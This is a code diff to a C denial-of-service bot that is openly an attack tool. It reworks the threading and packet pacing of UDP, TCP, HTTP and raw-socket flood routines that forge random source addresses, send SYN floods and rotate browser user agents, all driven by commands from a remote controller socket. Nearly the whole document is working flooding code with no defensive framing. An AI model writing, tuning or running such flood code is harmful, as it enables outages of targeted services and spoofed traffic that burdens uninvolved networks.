@@ -31,7 +31,7 @@
 #define MAX_THREADS 500
 #define DEFAULT_THREADS 100
 #define DEFAULT_SIZE 1400
-#define DEFAULT_PPS 1000000
+#define DEFAULT_PPS 100000
 #define DEFAULT_DELAY 1
 
 static int sock = -1;
@@ -60,9 +60,6 @@ static attack_args_t current_attack = {0};
 volatile int attack_running = 1;
 volatile unsigned long long packets_sent = 0;
 volatile unsigned long long bytes_sent = 0;
-pthread_t *attack_threads = NULL;
-attack_args_t *thread_args = NULL;
-int active_threads = 0;
 
 const char *user_agents[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
@@ -234,6 +231,8 @@ void *udp_flood(void *arg) {
     if (packet_size < 64) packet_size = 64;
 
     end_time = time(NULL) + args->duration;
+    int delay_us = 1000000 / args->pps;
+    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         random_payload((unsigned char *)packet, packet_size);
@@ -247,8 +246,23 @@ void *udp_flood(void *arg) {
             sent_count++;
         }
 
-        if (sent_count % 512 == 0) {
-            usleep(1);
+        if (args->threads > 1) {
+            for (int i = 1; i < args->threads; i++) {
+                random_payload((unsigned char *)packet, packet_size);
+                result = sendto(sockfd, packet, packet_size, 0,
+                               (struct sockaddr *)&target_addr, sizeof(target_addr));
+                if (result > 0) {
+                    packets_sent++;
+                    bytes_sent += result;
+                    sent_count++;
+                }
+            }
+        }
+
+        if (args->delay > 0) {
+            usleep(args->delay);
+        } else {
+            usleep(delay_us);
         }
     }
 
@@ -285,6 +299,8 @@ void *tcp_flood(void *arg) {
     if (packet_size < 64) packet_size = 64;
 
     end_time = time(NULL) + args->duration;
+    int delay_us = 1000000 / args->pps;
+    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         int conn = socket(AF_INET, SOCK_STREAM, 0);
@@ -299,8 +315,26 @@ void *tcp_flood(void *arg) {
             sent_count++;
         }
 
-        if (sent_count % 512 == 0) {
-            usleep(1);
+        if (args->threads > 1) {
+            for (int i = 1; i < args->threads; i++) {
+                int conn2 = socket(AF_INET, SOCK_STREAM, 0);
+                if (conn2 >= 0) {
+                    fcntl(conn2, F_SETFL, O_NONBLOCK);
+                    connect(conn2, (struct sockaddr *)&target_addr, sizeof(target_addr));
+                    random_payload((unsigned char *)packet, packet_size);
+                    send(conn2, packet, packet_size, 0);
+                    close(conn2);
+                    packets_sent++;
+                    bytes_sent += packet_size;
+                    sent_count++;
+                }
+            }
+        }
+
+        if (args->delay > 0) {
+            usleep(args->delay);
+        } else {
+            usleep(delay_us);
         }
     }
 
@@ -333,6 +367,8 @@ void *http_flood(void *arg) {
     }
 
     end_time = time(NULL) + args->duration;
+    int delay_us = 1000000 / args->pps;
+    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
@@ -348,8 +384,26 @@ void *http_flood(void *arg) {
             sent_count++;
         }
 
-        if (sent_count % 512 == 0) {
-            usleep(1);
+        if (args->threads > 1) {
+            for (int i = 1; i < args->threads; i++) {
+                build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
+                int conn2 = socket(AF_INET, SOCK_STREAM, 0);
+                if (conn2 >= 0) {
+                    fcntl(conn2, F_SETFL, O_NONBLOCK);
+                    connect(conn2, (struct sockaddr *)&target_addr, sizeof(target_addr));
+                    send(conn2, http_request, strlen(http_request), 0);
+                    close(conn2);
+                    packets_sent++;
+                    bytes_sent += strlen(http_request);
+                    sent_count++;
+                }
+            }
+        }
+
+        if (args->delay > 0) {
+            usleep(args->delay);
+        } else {
+            usleep(delay_us);
         }
     }
 
@@ -395,6 +449,8 @@ void *udp_raw_flood(void *arg) {
     }
 
     end_time = time(NULL) + args->duration;
+    int delay_us = 1000000 / args->pps;
+    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         ip_header = (struct iphdr *)packet;
@@ -436,8 +492,46 @@ void *udp_raw_flood(void *arg) {
             }
         }
 
-        if (sent_count % 512 == 0) {
-            usleep(1);
+        if (args->threads > 1) {
+            for (int i = 1; i < args->threads; i++) {
+                ip_header = (struct iphdr *)packet;
+                udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
+                payload = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));
+
+                ip_header->ihl = 5;
+                ip_header->version = 4;
+                ip_header->tos = 0;
+                ip_header->tot_len = htons(packet_size);
+                ip_header->id = htons(rand() & 0xFFFF);
+                ip_header->frag_off = 0;
+                ip_header->ttl = 255;
+                ip_header->protocol = IPPROTO_UDP;
+                ip_header->check = 0;
+                ip_header->saddr = random_ip();
+                ip_header->daddr = target_addr.sin_addr.s_addr;
+
+                udp_header->source = htons(1024 + (rand() % 64511));
+                udp_header->dest = htons(args->port);
+                udp_header->len = htons(sizeof(struct udphdr) + args->packet_size);
+                udp_header->check = 0;
+
+                random_payload(payload, args->packet_size);
+                ip_header->check = checksum((unsigned short *)packet, packet_size);
+
+                result = sendto(sockfd, packet, packet_size, 0,
+                               (struct sockaddr *)&target_addr, sizeof(target_addr));
+                if (result > 0) {
+                    packets_sent++;
+                    bytes_sent += result;
+                    sent_count++;
+                }
+            }
+        }
+
+        if (args->delay > 0) {
+            usleep(args->delay);
+        } else {
+            usleep(delay_us);
         }
     }
 
@@ -481,6 +575,8 @@ void *tcp_raw_flood(void *arg) {
     }
 
     end_time = time(NULL) + args->duration;
+    int delay_us = 1000000 / args->pps;
+    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         ip_header = (struct iphdr *)packet;
@@ -519,8 +615,49 @@ void *tcp_raw_flood(void *arg) {
             sent_count++;
         }
 
-        if (sent_count % 512 == 0) {
-            usleep(1);
+        if (args->threads > 1) {
+            for (int i = 1; i < args->threads; i++) {
+                ip_header = (struct iphdr *)packet;
+                tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
+
+                ip_header->ihl = 5;
+                ip_header->version = 4;
+                ip_header->tos = 0;
+                ip_header->tot_len = htons(packet_size);
+                ip_header->id = htons(rand() & 0xFFFF);
+                ip_header->frag_off = 0;
+                ip_header->ttl = 255;
+                ip_header->protocol = IPPROTO_TCP;
+                ip_header->check = 0;
+                ip_header->saddr = random_ip();
+                ip_header->daddr = target_addr.sin_addr.s_addr;
+
+                tcp_header->source = htons(1024 + (rand() % 64511));
+                tcp_header->dest = htons(args->port);
+                tcp_header->seq = rand();
+                tcp_header->ack_seq = 0;
+                tcp_header->doff = 5;
+                tcp_header->syn = 1;
+                tcp_header->window = htons(65535);
+                tcp_header->check = 0;
+                tcp_header->urg_ptr = 0;
+
+                ip_header->check = checksum((unsigned short *)packet, packet_size);
+
+                result = sendto(sockfd, packet, packet_size, 0,
+                               (struct sockaddr *)&target_addr, sizeof(target_addr));
+                if (result > 0) {
+                    packets_sent++;
+                    bytes_sent += result;
+                    sent_count++;
+                }
+            }
+        }
+
+        if (args->delay > 0) {
+            usleep(args->delay);
+        } else {
+            usleep(delay_us);
         }
     }
 
@@ -566,6 +703,8 @@ void *http_raw_flood(void *arg) {
     }
 
     end_time = time(NULL) + args->duration;
+    int delay_us = 1000000 / args->pps;
+    if (delay_us < 1) delay_us = 1;
 
     while (attack_running && time(NULL) < end_time) {
         build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
@@ -617,8 +756,58 @@ void *http_raw_flood(void *arg) {
             sent_count++;
         }
 
-        if (sent_count % 512 == 0) {
-            usleep(1);
+        if (args->threads > 1) {
+            for (int i = 1; i < args->threads; i++) {
+                build_http_request(http_request, args->host, args->path, sizeof(http_request), ua_counter++);
+                http_len = strlen(http_request);
+                packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + http_len;
+                if (packet_size > MAX_PACKET) {
+                    packet_size = MAX_PACKET;
+                    http_len = packet_size - sizeof(struct iphdr) - sizeof(struct tcphdr);
+                }
+                ip_header = (struct iphdr *)packet;
+                tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
+                payload = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
+
+                ip_header->ihl = 5;
+                ip_header->version = 4;
+                ip_header->tos = 0;
+                ip_header->tot_len = htons(packet_size);
+                ip_header->id = htons(rand() & 0xFFFF);
+                ip_header->frag_off = 0;
+                ip_header->ttl = 255;
+                ip_header->protocol = IPPROTO_TCP;
+                ip_header->check = 0;
+                ip_header->saddr = random_ip();
+                ip_header->daddr = target_addr.sin_addr.s_addr;
+
+                tcp_header->source = htons(1024 + (rand() % 64511));
+                tcp_header->dest = htons(args->port);
+                tcp_header->seq = rand();
+                tcp_header->ack_seq = 0;
+                tcp_header->doff = 5;
+                tcp_header->syn = 1;
+                tcp_header->window = htons(65535);
+                tcp_header->check = 0;
+                tcp_header->urg_ptr = 0;
+
+                memcpy(payload, http_request, http_len);
+                ip_header->check = checksum((unsigned short *)packet, packet_size);
+
+                result = sendto(sockfd, packet, packet_size, 0,
+                               (struct sockaddr *)&target_addr, sizeof(target_addr));
+                if (result > 0) {
+                    packets_sent++;
+                    bytes_sent += result;
+                    sent_count++;
+                }
+            }
+        }
+
+        if (args->delay > 0) {
+            usleep(args->delay);
+        } else {
+            usleep(delay_us);
         }
     }
 
@@ -628,25 +817,10 @@ void *http_raw_flood(void *arg) {
 
 void stop_attack() {
     attack_running = 0;
-    
-    if (attack_threads != NULL) {
-        for (int i = 0; i < active_threads; i++) {
-            if (attack_threads[i]) {
-                pthread_join(attack_threads[i], NULL);
-            }
-        }
-        free(attack_threads);
-        attack_threads = NULL;
+    if (current_attack.attack_thread) {
+        pthread_join(current_attack.attack_thread, NULL);
     }
-    
-    if (thread_args != NULL) {
-        free(thread_args);
-        thread_args = NULL;
-    }
-    
-    active_threads = 0;
     memset(&current_attack, 0, sizeof(current_attack));
-    
     if (sock > 0) {
         send(sock, "ATTACK_STOPPED\n", 15, 0);
     }
@@ -752,38 +926,22 @@ void start_attack(char *cmd) {
         }
     }
     
-    active_threads = threads;
-    attack_threads = malloc(threads * sizeof(pthread_t));
-    thread_args = malloc(threads * sizeof(attack_args_t));
-    
-    if (attack_threads == NULL || thread_args == NULL) {
+    if (pthread_create(&current_attack.attack_thread, NULL, attack_func, &current_attack) != 0) {
         if (sock > 0) {
-            send(sock, "ERROR: Memory allocation failed\n", 32, 0);
+            send(sock, "ERROR: Failed to start attack\n", 30, 0);
         }
         attack_running = 0;
         return;
     }
     
-    for (int i = 0; i < threads; i++) {
-        memcpy(&thread_args[i], &current_attack, sizeof(attack_args_t));
-        thread_args[i].thread_id = i;
-        thread_args[i].threads = 1;
-        
-        if (pthread_create(&attack_threads[i], NULL, attack_func, &thread_args[i]) != 0) {
-            if (sock > 0) {
-                send(sock, "ERROR: Failed to start attack thread\n", 37, 0);
-            }
-            attack_running = 0;
-            return;
-        }
-        pthread_detach(attack_threads[i]);
-    }
+    pthread_detach(current_attack.attack_thread);
     
     if (sock > 0) {
         char response[256];
         snprintf(response, sizeof(response), "ATTACK_STARTED:%s:%d:%d:%s:%d:%d:%d:%d:root=%d\n",
                  current_attack.target, current_attack.port, current_attack.duration,
-                 actual_method, threads, pps, size, delay, is_root);
+                 actual_method, current_attack.threads, current_attack.pps,
+                 current_attack.packet_size, current_attack.delay, is_root);
         send(sock, response, strlen(response), 0);
     }
 }
